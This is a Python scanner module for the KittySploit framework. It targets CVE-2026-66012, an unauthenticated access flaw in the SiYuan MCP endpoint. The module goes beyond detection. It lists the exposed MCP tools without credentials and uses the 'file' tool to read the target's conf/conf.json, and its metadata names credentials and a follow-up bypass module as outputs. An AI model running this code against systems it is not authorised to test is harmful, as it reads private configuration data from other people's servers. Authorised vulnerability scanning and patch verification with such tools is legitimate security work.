#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Detect SiYuan CVE-2026-66012 unauthenticated MCP file tool access."""

import json

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "SiYuan CVE-2026-66012 MCP Auth Bypass Detect",
        "description": (
            "Detects CVE-2026-66012 in SiYuan kernel 3.7.0 <= v < 3.7.2: POST /mcp on the Publish "
            "port (default 6808) accepts anonymous RoleReader JWTs when Publish auth is disabled, "
            "exposing MCP tools including workspace file read without credentials."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-66012"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-66012",
            "https://www.cve.org/CVERecord?id=CVE-2026-66012",
        ],
        "modules": ["auxiliary/admin/http/siyuan_cve_2026_66012_auth_bypass"],
        "tags": [
            "web",
            "scanner",
            "siyuan",
            "mcp",
            "auth-bypass",
            "file-read",
            "cve-2026-66012",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "credentials", "exploit_paths"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["siyuan"],
                "endpoint_pattern_any": ["/mcp"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "auth_bypass", "from_detail": "anonymous MCP access"},
                    {"capability": "file_read", "from_detail": "MCP file tool"},
                ],
                "suggested_followups": [
                    "auxiliary/admin/http/siyuan_cve_2026_66012_auth_bypass",
                ],
            },
        },
    }

    port = OptPort(6808, "SiYuan Publish proxy port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    mcp_path = OptString("/mcp", "MCP HTTP endpoint path", False, advanced=True)

    def __init__(self, framework=None):
        super().__init__(framework)
        self._mcp_mode = None
        self._mcp_session_id = None

    def _endpoint(self) -> str:
        base = (self.path or "/").rstrip("/")
        suffix = str(self.mcp_path or "/mcp")
        if not suffix.startswith("/"):
            suffix = f"/{suffix}"
        return f"{base}{suffix}" if base else suffix

    def _parse_mcp_body(self, response):
        if not response:
            return None
        text = (response.text or "").strip()
        if text.startswith("data:"):
            lines = [line[5:].strip() for line in text.splitlines() if line.startswith("data:")]
            text = "".join(lines)
        if not text:
            return None
        try:
            return json.loads(text)
        except ValueError:
            return None

    def _mcp_post(self, payload: dict, extra: dict = None):
        headers = {
            "Accept": "application/json, text/event-stream",
            "Accept-Encoding": "identity",
        }
        if extra:
            headers.update(extra)
        response = self.http_request(
            method="POST",
            path=self._endpoint(),
            json=payload,
            headers=headers,
            session=True,
            allow_redirects=False,
            timeout=int(self.timeout or 15),
        )
        code = int(response.status_code or 0) if response else 0
        session_id = None
        if response and response.headers:
            session_id = response.headers.get("Mcp-Session-Id") or response.headers.get("mcp-session-id")
        return code, session_id, self._parse_mcp_body(response)

    def _mcp_handshake(self) -> bool:
        payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "initialize",
            "params": {
                "protocolVersion": "2025-06-18",
                "capabilities": {},
                "clientInfo": {"name": "kittysploit", "version": "1.0"},
            },
        }
        code, session_id, _parsed = self._mcp_post(payload)
        if code != 200:
            return False
        if session_id:
            self._mcp_session_id = session_id
        return True

    def _mcp_rpc(self, method: str, params=None, rid: int = 1):
        payload = {"jsonrpc": "2.0", "id": rid, "method": method}
        if params is not None:
            payload["params"] = params

        if self._mcp_mode in (None, "2026"):
            code, _sid, parsed = self._mcp_post(
                payload,
                {"MCP-Protocol-Version": "2026-07-28"},
            )
            if code == 200:
                self._mcp_mode = "2026"
                return code, parsed
            if self._mcp_mode == "2026" or code in (401, 403):
                return code, parsed

        if not self._mcp_session_id and not self._mcp_handshake():
            return 0, None
        self._mcp_mode = "classic"
        extra = {"Mcp-Session-Id": self._mcp_session_id} if self._mcp_session_id else {}
        code, _sid, parsed = self._mcp_post(payload, extra)
        return code, parsed

    def _file_read(self, path: str, rid: int = 2):
        code, parsed = self._mcp_rpc(
            "tools/call",
            {"name": "file", "arguments": {"action": "read", "path": path, "limit": -1}},
            rid=rid,
        )
        if not isinstance(parsed, dict):
            return code, None, True
        result = parsed.get("result") or {}
        content = result.get("content") if isinstance(result, dict) else None
        text = None
        if isinstance(content, list) and content and isinstance(content[0], dict):
            text = content[0].get("text")
        is_error = bool(result.get("isError")) if isinstance(result, dict) else True
        return code, text, is_error

    def run(self):
        code, parsed = self._mcp_rpc("tools/list", rid=1)
        tools = []
        if isinstance(parsed, dict):
            tools = (parsed.get("result") or {}).get("tools") or []
        if not tools:
            if code in (401, 403):
                print_status(f"CVE-2026-66012 blocked on /mcp (HTTP {code})")
            return False

        names = [t.get("name") for t in tools if isinstance(t, dict)]
        if "file" not in names:
            print_status(f"CVE-2026-66012 MCP exposed ({len(tools)} tools) but no file tool")
            self.set_info(
                severity="high",
                reason=f"CVE-2026-66012: {len(tools)} MCP tools without credentials",
                cve="CVE-2026-66012",
                path=self._endpoint(),
            )
            return True

        _code, text, is_error = self._file_read("conf/conf.json")
        if is_error or not text:
            print_status("CVE-2026-66012 MCP file tool reachable; conf/conf.json unreadable")
            self.set_info(
                severity="high",
                reason="CVE-2026-66012: unauthenticated MCP file tool",
                vulnerable=True,
                cve="CVE-2026-66012",
                path=self._endpoint(),
            )
            return True

        reason = f"CVE-2026-66012: read conf/conf.json ({len(text)} bytes) via anonymous MCP"
        print_status("CVE-2026-66012 vuln=True")
        self.set_info(
            severity="critical",
            reason=reason,
            vulnerable=True,
            cve="CVE-2026-66012",
            path=self._endpoint(),
        )
        return True
